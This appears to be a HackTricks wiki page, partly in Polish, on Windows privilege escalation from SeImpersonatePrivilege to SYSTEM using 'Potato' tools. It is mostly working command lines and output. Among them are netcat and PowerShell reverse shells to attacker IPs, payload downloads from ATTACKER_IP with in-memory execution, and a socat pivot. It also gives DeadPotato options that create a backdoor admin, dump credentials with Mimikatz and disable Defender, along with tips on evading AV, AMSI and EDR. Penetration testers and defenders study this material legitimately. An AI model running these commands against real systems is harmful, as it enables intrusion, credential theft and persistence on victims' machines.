# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** can be used to **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.

> [!TIP]
> Nowoczesną alternatywą, aktywnie utrzymywaną w 2024–2025, jest SigmaPotato (fork GodPotato), która dodaje użycie in-memory/.NET reflection oraz rozszerzone wsparcie OS. Zobacz krótkie użycie poniżej i repozytorium w References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Requirements and common gotchas

All the following techniques rely on abusing an impersonation-capable privileged service from a context holding either of these privileges:

- SeImpersonatePrivilege (most common) or SeAssignPrimaryTokenPrivilege
- High integrity is not required if the token already has SeImpersonatePrivilege (typical for many service accounts such as IIS AppPool, MSSQL, etc.)

Szybko sprawdź uprawnienia:
```cmd
whoami /priv | findstr /i impersonate
```
Operational notes:

- Jeśli twoja powłoka działa pod ograniczonym tokenem pozbawionym SeImpersonatePrivilege (częste dla Local Service/Network Service w niektórych kontekstach), przywróć domyślne uprawnienia konta używając FullPowers, a następnie uruchom Potato. Przykład: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer wymaga, aby usługa Print Spooler była uruchomiona i osiągalna przez lokalny endpoint RPC (spoolss). W wzmocnionych środowiskach, gdzie Spooler jest wyłączony po PrintNightmare, preferuj RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato wymaga OXID resolver osiągalnego na TCP/135. Jeśli egress jest zablokowany, użyj redirectora/przekierowania portu (zobacz przykład poniżej). Starsze buildy wymagały flagi -f.
- EfsPotato/SharpEfsPotato wykorzystują MS-EFSR; jeśli jeden pipe jest zablokowany, spróbuj alternatywnych pipe'ów (lsarpc, efsrpc, samr, lsass, netlogon).
- Błąd 0x6d3 podczas RpcBindingSetAuthInfo zwykle wskazuje na nieznaną/nieobsługiwaną usługę uwierzytelniania RPC; spróbuj innego pipe/transportu lub upewnij się, że docelowa usługa działa.
- Forki "kitchen-sink" takie jak DeadPotato pakują dodatkowe moduły payload (Mimikatz/SharpHound/Defender off), które zapisują na dysku; oczekuj wyższego wykrycia przez EDR w porównaniu do szczupłych oryginałów.

## Szybka demonstracja

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Uwaga:
- Możesz użyć -i, aby uruchomić interaktywny proces w bieżącej konsoli, lub -c, aby wykonać one-liner.
- Wymaga usługi Spooler. Jeśli jest wyłączona, operacja zakończy się niepowodzeniem.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Jeśli outbound 135 jest zablokowany, pivot the OXID resolver za pomocą socat na redirectorze:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato to nowszy prymityw nadużycia COM wydany pod koniec 2022, który celuje w usługę **PrintNotify** zamiast Spooler/BITS. Binarium tworzy instancję serwera COM PrintNotify, podstawia fałszywe `IUnknown`, a następnie wywołuje uprzywilejowane wywołanie zwrotne przez `CreatePointerMoniker`. Kiedy usługa PrintNotify (działająca jako **SYSTEM**) ponownie się łączy, proces duplikuje zwrócony token i uruchamia dostarczony payload z pełnymi uprawnieniami.

Kluczowe uwagi operacyjne:

* Działa na Windows 10/11 i Windows Server 2012–2022, o ile zainstalowana jest usługa Print Workflow/PrintNotify (jest obecna nawet gdy legacy Spooler jest wyłączony po PrintNightmare).
* Wymaga, aby kontekst wywołujący posiadał **SeImpersonatePrivilege** (typowe dla IIS APPPOOL, MSSQL i kont usług zadań zaplanowanych).
* Akceptuje bezpośrednie polecenie lub tryb interaktywny, dzięki czemu możesz pozostać w oryginalnej konsoli. Przykład:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Ponieważ opiera się wyłącznie na COM, nie są wymagane nasłuchiwacze named-pipe ani zewnętrzne redirectory, dzięki czemu może być użyty jako zamiennik na hostach, gdzie Defender blokuje RPC binding RoguePotato.

Operatorzy tacy jak Ink Dragon uruchamiają PrintNotifyPotato natychmiast po uzyskaniu ViewState RCE na SharePoint, aby przemieścić się z procesu `w3wp.exe` do SYSTEM przed zainstalowaniem ShadowPad.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Wskazówka: jeśli jeden pipe zawiedzie lub EDR go zablokuje, spróbuj innych obsługiwanych pipes:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Notatki:
- Działa na Windows 8/8.1–11 oraz Server 2012–2022, gdy obecne jest SeImpersonatePrivilege.
- Pobierz binarkę pasującą do zainstalowanego runtime'u (np. `GodPotato-NET4.exe` na nowoczesnym Server 2022).
- Jeśli twoim początkowym mechanizmem wykonania jest webshell/UI z krótkimi timeoutami, umieść payload jako skrypt i poproś GodPotato, aby go uruchomił zamiast długiego polecenia inline.

Szybki staging pattern z zapisywalnego IIS webroot:
```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```
### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato oferuje dwie warianty skierowane do obiektów DCOM usług, które domyślnie ustawione są na RPC_C_IMP_LEVEL_IMPERSONATE. Skompiluj lub użyj dostarczonych binariów i uruchom swoją komendę:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (zaktualizowany GodPotato fork)

SigmaPotato dodaje nowoczesne udogodnienia, takie jak in-memory execution przez .NET reflection oraz PowerShell reverse shell helper.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Additional perks in 2024–2025 builds (v1.2.x):
- Wbudowana flaga reverse shell `--revshell` oraz usunięcie limitu 1024 znaków w PowerShell, dzięki czemu możesz odpalić długie payloady omijające AMSI za jednym razem.
- Składnia przyjazna reflection (`[SigmaPotato]::Main()`), plus prymitywny trik omijania AV przez `VirtualAllocExNuma()` w celu zmylenia prostych heurystyk.
- Osobny `SigmaPotatoCore.exe` skompilowany pod .NET 2.0 dla środowisk PowerShell Core.

### DeadPotato (2024 GodPotato — przeróbka z modułami)

DeadPotato zachowuje łańcuch impersonacji GodPotato OXID/DCOM, ale wbudowuje pomocniki post-exploitation, dzięki czemu operatorzy mogą od razu przejąć SYSTEM i wykonać persistence/collection bez dodatkowych narzędzi.

Common modules (all require SeImpersonatePrivilege):

- `-cmd "<cmd>"` — uruchom dowolne polecenie jako SYSTEM.
- `-rev <ip:port>` — szybki reverse shell.
- `-newadmin user:pass` — utwórz lokalnego administratora dla persistence.
- `-mimi sam|lsa|all` — upuści i uruchomi Mimikatz, by wydumpować poświadczenia (zapisuje na dysku, bardzo głośne).
- `-sharphound` — uruchom kolekcję SharpHound jako SYSTEM.
- `-defender off` — wyłącz ochronę w czasie rzeczywistym Defendera (bardzo głośne).

Przykładowe one-linery:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Ponieważ zawiera dodatkowe pliki binarne, spodziewaj się większej liczby wykryć przez AV/EDR; użyj lżejszych GodPotato/SigmaPotato, gdy liczy się stealth.

## Referencje

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [HTB: Job — LibreOffice macro → IIS webshell → GodPotato to SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
